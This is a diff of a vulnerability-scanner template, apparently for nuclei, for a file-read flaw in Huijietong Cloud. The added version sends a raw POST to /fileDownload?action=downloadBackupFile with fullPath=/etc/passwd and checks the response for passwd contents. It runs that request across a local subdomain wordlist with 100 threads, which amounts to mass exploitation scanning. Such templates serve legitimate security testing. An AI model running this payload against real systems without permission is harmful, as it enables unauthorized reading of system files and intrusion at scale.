@@ -1,16 +1,32 @@
 id: huijietong-cloud-fileread
-
 info:
-    name: Huijietong Cloud File Read
-    author: zan8in
-    severity: high
+  name: Huijietong Cloud File Read
+  author: princechaddha
+  severity: high
+  tags: huijietong,lfi
 
-rules:
-    r0:
-        request:
-            cache: true
-            method: POST
-            path: /fileDownload?action=downloadBackupFile
-            body: fullPath=/etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0()
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        POST /fileDownload?action=downloadBackupFile HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+        fullPath=/etc/passwd
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:.*:0:0"
+
+      - type: status
+        status:
+          - 200
